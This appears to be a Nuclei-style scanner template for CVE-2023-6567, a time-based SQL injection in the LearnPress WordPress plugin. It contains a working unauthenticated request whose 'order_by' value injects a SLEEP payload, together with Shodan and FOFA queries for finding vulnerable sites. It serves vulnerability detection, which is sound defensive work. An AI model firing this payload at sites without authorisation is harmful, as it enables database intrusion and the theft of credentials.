http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - contains_all(header, "lp_session_guest=", "application/json")
    - contains_all(body, "status\":\"success", "No courses were found")
    type: dsl
  raw:
  - '@timeout: 20s

    GET /wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-6567
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:thimpress:learnpress:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-6567
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-89
    epss-percentile: 0.9926
    epss-score: 0.8397
  description: 'The LearnPress plugin for WordPress is vulnerable to time-based SQL
    Injection via the ''order_by'' parameter in all versions up to, and including,
    4.2.5.7 due to insufficient escaping on the user supplied parameter and lack of
    sufficient preparation on the existing SQL query. This makes it possible for unauthenticated
    attackers to append additional SQL queries into already existing queries that
    can be used to extract sensitive information from the database.

    '
  impact: 'Unauthenticated attackers can execute time-based SQL injection through
    the order_by parameter to extract the complete WordPress database including user
    credentials and course data.

    '
  metadata:
    fofa-query: body=/wp-content/plugins/learnpress
    framework: wordpress
    max-request: 1
    product: learnpress
    publicwww-query: /wp-content/plugins/learnpress
    shodan-query: http.html:/wp-content/plugins/learnpress
    vendor: thimpress
    verified: true
  name: LearnPress <= 4.2.5.7 - SQL Injection
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/learnpress/learnpress-4257-unauthenticated-sql-injection-via-order-by
  - https://wpscan.com/vulnerability/c5110450-3b4e-4100-8db4-0d7f5d43c12f/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-6567
  - https://plugins.trac.wordpress.org/changeset/3013957/learnpress
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/6ab578cd-3a0b-43d3-aaa7-0a01f431a4e2?source=cve
  remediation: Fixed in version 4.2.5.8
  severity: high
  tags: time-based-sqli,wpscan,cve,cve2023,wp,wp-plugin,wordpress,learnpress,sqli,thimpress,vkev,vuln
